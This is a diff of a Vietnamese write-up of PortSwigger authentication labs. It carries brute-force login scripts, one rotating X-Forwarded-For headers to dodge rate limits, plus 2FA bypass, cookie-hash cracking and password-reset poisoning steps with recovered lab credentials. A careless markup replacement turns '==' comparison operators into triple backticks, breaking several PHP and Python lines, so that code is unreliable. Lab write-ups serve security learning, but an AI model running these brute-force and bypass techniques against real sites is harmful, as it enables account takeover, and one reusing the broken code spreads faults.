@@ -90,13 +90,13 @@ Trong cột Lengh, xuất hiện dòng response với độ dài khác so với 
 
 trang đã chuyển hướng chúng ta đến tài khoản của người dùng có id = amarillo
 
-- Như vậy chúng ta đã tìm được ==username:password== là ==amarillo:maggie==. Đăng nhập thôi!
+- Như vậy chúng ta đã tìm được ```username:password``` là ```amarillo:maggie```. Đăng nhập thôi!
 
 ![image](https://hackmd.io/_uploads/By0uVZRYp.png)
 
 mình đã viết lại script khai thác:
 
-```python=
+```python
 #!/usr/bin/python3.7
 import requests
 import re
@@ -151,7 +151,7 @@ link: https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-s
 
 Từ các dấu hiệu này có thể suy đoán rằng thực chất khi đăng nhập đúng tài khoản tại trang /login, chúng ta đã được xác thực thành công tại trang /login, còn trang /login2 giống như một thao tác phụ để xác thực mã code.
 
-- và chúng ta nhận thấy cookie ở 2 trang ==/login== và ==/login2== là khác nhau
+- và chúng ta nhận thấy cookie ở 2 trang ```/login``` và ```/login2``` là khác nhau
 
 ![image](https://hackmd.io/_uploads/HkDhoX0Ka.png)
 
@@ -161,7 +161,7 @@ Thật vậy, trước khi điền mã 2FA, thay đổi URL dẫn tới trang c�
 
 ### Khai thác
 
-- Như vậy, chúng ta có thể trực tiếp sửa URL thành /my-account?id=carlos sau khi đăng nhập ==carlos:montoya== tại trang /login
+- Như vậy, chúng ta có thể trực tiếp sửa URL thành /my-account?id=carlos sau khi đăng nhập ```carlos:montoya``` tại trang /login
 
 ![image](https://hackmd.io/_uploads/SyhJDXCY6.png)
 
@@ -169,7 +169,7 @@ vậy là chúng ta đã vượt qua lớp xác thực còn lại
 
 mình đã viết lại script khai thác
 
-```python=
+```python
 #!/usr/bin/python3.7
 import requests
 import re
@@ -234,7 +234,7 @@ Truy cập link đặt lại mật khẩu, quan sát request qua Burp Suite:
 
 ![image](https://hackmd.io/_uploads/SkBUnSCta.png)
 
-- Chúng ta thấy tại request này, client đã gửi tới server các giá trị ==temp-forgot-password-token, username, new-password-1, new-password-2== qua phương thức POST.
+- Chúng ta thấy tại request này, client đã gửi tới server các giá trị ```temp-forgot-password-token, username, new-password-1, new-password-2``` qua phương thức POST.
 
 - Từ các tham số này, chúng ta có thể dự đoán hệ thống xác thực yêu cầu đặt lại mật khẩu bằng tham số temp-forgot-password-token (token được gửi cho tài khoản mail yêu cầu đặt lại mật khẩu) và xác thực danh tính người dùng cần đặt lại mật khẩu qua tham số username, sau đó hai tham số new-password-1 và new-password-2 tương ứng là mật khẩu mới và xác nhận mật khẩu mới.
 
@@ -244,7 +244,7 @@ Truy cập link đặt lại mật khẩu, quan sát request qua Burp Suite:
 
 ![image](https://hackmd.io/_uploads/r11nV8AK6.png)
 
-mình đăng nhập tài khoản ==carlos:123== và giải quyết được lab này
+mình đăng nhập tài khoản ```carlos:123``` và giải quyết được lab này
 
 ![image](https://hackmd.io/_uploads/HkBRN80Y6.png)
 
@@ -276,7 +276,7 @@ Lúc này, chúng ta cần có thao tác tự động hóa việc nhận biết 
 
 ![image](https://hackmd.io/_uploads/B13UJoCYa.png)
 
-Bắt đầu tấn công thôi nào! Sau khi kết thúc, sắp xếp lại cột warining nhận thấy request 91 trả về dòng thông báo `Invalid username or password`khác với các dòng thông báo khác (Thiếu dấu . đây là sự bất cẩn của người lập trình). Như vậy chúng ta thu được username của victim là ==americas==
+Bắt đầu tấn công thôi nào! Sau khi kết thúc, sắp xếp lại cột warining nhận thấy request 91 trả về dòng thông báo `Invalid username or password`khác với các dòng thông báo khác (Thiếu dấu . đây là sự bất cẩn của người lập trình). Như vậy chúng ta thu được username của victim là ```americas```
 
 ![image](https://hackmd.io/_uploads/r1ZVej0Ya.png)
 
@@ -286,7 +286,7 @@ Thực hiện tấn công tương tự với danh sách passwords được cung 
 
 ![image](https://hackmd.io/_uploads/By0ixjCYa.png)
 
-Như vậy chúng ta có tài khoản victim là ==americas:qazwsx== mình đăng nhập và hoàn thành lab.
+Như vậy chúng ta có tài khoản victim là ```americas:qazwsx``` mình đăng nhập và hoàn thành lab.
 
 ![image](https://hackmd.io/_uploads/SkcNWiAY6.png)
 
@@ -321,7 +321,7 @@ $query = "SELECT * FROM users WHERE username = '$username'";
 $result = mysqli_query($connect, $query);
 $count = mysqli_num_rows($result);
 
-if ($count == 1) {
+if ($count ``` 1) {
     $row = mysqli_fetch_array($result);
     if (md5($password) != $row['password']) {
         echo "Invalid username or password!";
@@ -381,21 +381,21 @@ Quan sát cột giá trị Response received và Response completed thấy reque
 
 ![image](https://hackmd.io/_uploads/H1wQSex5p.png)
 
-- Điều này chứng tỏ username cần tìm là ==alerts==. Tiếp tục thực hiện như trên với danh sách passwords.
+- Điều này chứng tỏ username cần tìm là ```alerts```. Tiếp tục thực hiện như trên với danh sách passwords.
 
 ![image](https://hackmd.io/_uploads/B1dvIexc6.png)
 
 Khi cuộc tấn công kết thúc, hãy tìm phản hồi kèm theo 302 trạng thái. Hãy ghi lại mật khẩu này.
 
-- chúng ta thu được tài khoản hợp lệ là ==alerts:cheese==. Đăng nhập và giải quyết lab:
+- chúng ta thu được tài khoản hợp lệ là ```alerts:cheese```. Đăng nhập và giải quyết lab:
 
 ![image](https://hackmd.io/_uploads/rkA68gxcT.png)
 
 mình đã làm lại lab này và viết mã khai thác
 
-mình thấy thấy ==wiener: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa== status 302 response time xấp xỉ 3000 milliseconds
+mình thấy thấy ```wiener: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa``` status 302 response time xấp xỉ 3000 milliseconds
 
-```python=
+```python
 import requests
 import time
 url = 'https://0a73009803ee1c1c813a3eae00b20033.web-security-academy.net/login'
@@ -415,7 +415,7 @@ password = file_password.readline().strip()
 # print(password)
 for i in range(101):
     response = requests.post(url,data={'username': username, 'password': password}, allow_redirects= False,headers={'X-Forwarded-For': '118.71.204.'+ str(i)})
-    if(response.status_code == 302):
+    if(response.status_code ``` 302):
         print("Mật khẩu là:" + password)
         break
     password = file_password.readline().strip()
@@ -423,7 +423,7 @@ for i in range(101):
 
 ![image](https://hackmd.io/_uploads/BJu1GZlqa.png)
 
-và được tài khoản là ==am:666666== đồng thời chúng ta cũng đã giải được lab này
+và được tài khoản là ```am:666666``` đồng thời chúng ta cũng đã giải được lab này
 
 ![image](https://hackmd.io/_uploads/rktu-bgcT.png)
 
@@ -496,7 +496,7 @@ mình đã viết mã khai thác cho bài này
 
 - với tạo file tài khoản mình sẽ tạo cho khi đăng nhập 1 lần trong list password sẽ đăng nhập tài khoản đúng `wiener:peter`
 
-```python=
+```python
 usrname = open('./username.txt', 'r')
 new_usrname = open('new_username.txt', 'w')
 for word in usrname:
@@ -512,7 +512,7 @@ for word in passwds:
 
 - mã khai thác
 
-```python=
+```python
 import requests
 import time
 url = 'https://0a44004c044170bb8161307e00f2001a.web-security-academy.net/login'
@@ -524,7 +524,7 @@ password = file_password.readline().strip()
 
 for i in range(101):
     response = requests.post(url,data={'username': username, 'password': password}, allow_redirects= False,)
-    if(username != "wiener" and response.status_code == 302 ):
+    if(username != "wiener" and response.status_code ``` 302 ):
         print("Mật khẩu của carlos là: " + password)
         break
     password = file_password.readline().strip()
@@ -533,8 +533,8 @@ for i in range(101):
 
 ![image](https://hackmd.io/_uploads/SyRU0tgcT.png)
 
-mình nhận được mật khẩu là ==football==
-mình đăng nhập tài khoản ==carlos:football== và giải được lab này
+mình nhận được mật khẩu là ```football```
+mình đăng nhập tài khoản ```carlos:football``` và giải được lab này
 
 ![image](https://hackmd.io/_uploads/SkwXAKg56.png)
 
@@ -570,7 +570,7 @@ Username app bị khóa, suy ra đây là một tên đăng nhập hợp lệ. T
 
 mình đã viết lại mã khai thác
 
-```python=
+```python
 import requests
 from tqdm import tqdm
 url = 'https://0aee0016044a70e5814e4ed300320023.web-security-academy.net/login'
@@ -612,7 +612,7 @@ for password in tqdm(passwords):
 
 ![image](https://hackmd.io/_uploads/B1nI-jeqp.png)
 
-mình được tài khoản là ==app:monkey== và đăng nhập và giải quyết được bài lab
+mình được tài khoản là ```app:monkey``` và đăng nhập và giải quyết được bài lab
 
 ## 8. Lab: 2FA broken logic
 
@@ -692,10 +692,10 @@ Chức năng này thường được người dùng lựa chọn sử dụng ho�
 
 ![image](https://hackmd.io/_uploads/r1B-1BZ5T.png)
 
-Hệ thống xác nhận việc ghi nhớ đăng nhập bằng giá trị cookie: ==d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhN==
+Hệ thống xác nhận việc ghi nhớ đăng nhập bằng giá trị cookie: ```d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhN```
 
 mình dùng cyberchef và chọn kiểu **magic** để tự động decode
-và thấy nó decode base64 được ==wiener:51dc30ddc473d43a6011e9ebba6ca770==
+và thấy nó decode base64 được ```wiener:51dc30ddc473d43a6011e9ebba6ca770```
 
 ![ảnh](https://hackmd.io/_uploads/SJXuq4b9p.png)
 
@@ -703,7 +703,7 @@ và thấy nó decode base64 được ==wiener:51dc30ddc473d43a6011e9ebba6ca770=
 
 - và burp suite cũng tự decode cho chúng ta ở bên trái
 
-mình đoán ==51dc30ddc473d43a6011e9ebba6ca770== khả năng lớn là mật khẩu của `wiener` sau khi được mã hóa bằng cách nào đó. Lúc này, dùng trang web này sẽ không tìm ra cách mã hóa nữa
+mình đoán ```51dc30ddc473d43a6011e9ebba6ca770``` khả năng lớn là mật khẩu của `wiener` sau khi được mã hóa bằng cách nào đó. Lúc này, dùng trang web này sẽ không tìm ra cách mã hóa nữa
 
 - Quan sát các kí tự tạo thành: được tạo thành từ các chữ số 0-9 và các chữ cái thường từ a đến e.
 - Độ dài bằng đúng 32 kí tự
@@ -782,16 +782,16 @@ và sau đó vào phần access log để xem log của server và chúng ta th�
 
 ![image](https://hackmd.io/_uploads/S1MWcSWcp.png)
 
-ở phần stay-log-in có giá trị: ==Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz==  
+ở phần stay-log-in có giá trị: ```Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz```  
 ![image](https://hackmd.io/_uploads/H1nG5BZ9T.png)
 
 và mình đem decode base64 được giá trị
-==carlos:26323c16d5f4dabff3bb136f2460a943==
+```carlos:26323c16d5f4dabff3bb136f2460a943```
 đêm mật khẩu crack trên trang web crackstation
 
 ![image](https://hackmd.io/_uploads/SJ0DqBZq6.png)
 
-và mình có tài khoản của người dùng là ==carlos:onceuponatime==
+và mình có tài khoản của người dùng là ```carlos:onceuponatime```
 
 sau đó minhf đăng nhập vào tài khoản và xóa đi tài khoản này
 
@@ -852,7 +852,7 @@ Thêm header X-Forwarded-Host và đặt lại mật khẩu "giúp" carlos:
 
 ![image](https://hackmd.io/_uploads/B1pGjAWcp.png)
 
-==temp-forgot-password-token=fjxb3gxl61ivtbdnu548mosc5a6bszu9==
+```temp-forgot-password-token=fjxb3gxl61ivtbdnu548mosc5a6bszu9```
 
 Bây giờ có thể dễ dàng cập nhật mật khẩu của carlos:
 
@@ -909,7 +909,7 @@ mình nhận được warning `new password do not match` khi nhập mật khẩ
 
 ![image](https://hackmd.io/_uploads/HkSQyJGcp.png)
 
-vậy chúng ta có tài khoản ==carlos:computer== và đăng nhập chúng ta đã giải quyết được bài lab này
+vậy chúng ta có tài khoản ```carlos:computer``` và đăng nhập chúng ta đã giải quyết được bài lab này
 
 ![image](https://hackmd.io/_uploads/SyejJJzca.png)
 
@@ -939,7 +939,7 @@ Tên đăng nhập và mật khẩu được gửi tới hệ thống theo đị
 
 ### Khai thác
 
-```python=
+```python
 passwds = open('./password.txt', 'r').read().splitlines()
 s = ""
 for a in passwds:
